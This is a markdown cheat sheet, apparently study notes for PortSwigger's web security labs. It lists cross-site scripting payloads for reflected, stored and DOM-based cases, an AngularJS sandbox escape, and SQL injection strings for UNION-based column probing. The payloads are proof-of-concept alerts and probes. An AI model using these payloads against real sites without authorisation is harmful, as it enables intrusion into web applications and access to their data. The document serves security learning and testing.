# **<a name="webapp">Web Application table of Contents</a>**
* [XSS](#xss)
* [SQLi](#SQLi)




# **<a name="xss">XSS</a>**

## Reflected 
`GET /?search=<script>alert(1)</script> HTTP/1.1`

### escape script and backslash

`</script><img src=1 onerror=alert(document.domain)>`

`</script><script>alert(1)</script>`

### Brak out of javascript string

`'-alert(document.domain)-'`

`'+alert(document.domain)+'`

`';alert(document.domain)//`

`http://foo?&apos;-alert(1)-&apos;`

`${alert(document.domain)}`

`javascript:"/*'/*'/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`


## Stored

Enter the following into the comment box

`<script>alert(1)</script>`

`"onmouseover="alert(1)`

Inserted in GET/POST request

`<a id="author" href="javascript:alert(document.domain)">test</a>`

## DOM XSS

If you search 5333 in search bar

in javascript function calls 

    function trackSearch(query) 
    {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query){trackSearch(query);}  
    <img src="/resources/images/tracker.gif?searchTerms=5333">
                                          
search for 

` "><svg onload=alert(1)>`

this will break out new paramiter in javascript

     <img src="/resources/images/tracker.gif?searchTerms=">
     <svg onload="alert(1)">"&gt;
     <section class="blog-list">
     </section></svg>


### Sinks

https://brutelogic.com.br/blog/dom-based-xss-the-3-sinks/

Document sink
 
`name=<img+src+onerror=alert(1)>`
 
Location sink
 
`redir=javascript:alert(1)`  
`&storeId="></select><img+src%3d1+onerror%3dalert(1)>`
 
Execution sink eval call error
  
  `index=alert(1)`
  
  angular js sink
  
  `{{$on.constructor('alert(1)')()}}`
 
 
# **<a name="SQLi">SQLi</a>**

`xyz' OR 1=1--`

## Union


Injection

`xyz' UNION SELECT 'a' WHERE 1=1--`  
`xyz' UNION SELECT 'a' WHERE 1=2--`

Finding injectable fields  

`GET /filter?category=Accessories'+UNION+SELECT+NULL,'Injectable',NULL--+ HTTP/1.1`  
`' UNION SELECT 'a',NULL,NULL,NULL--`  
`' UNION SELECT NULL,'a',NULL,NULL--`  
`' UNION SELECT NULL,NULL,'a',NULL--`  
`' UNION SELECT NULL,NULL,NULL,'a'--`  


























Referances:

https://portswigger.net/web-security
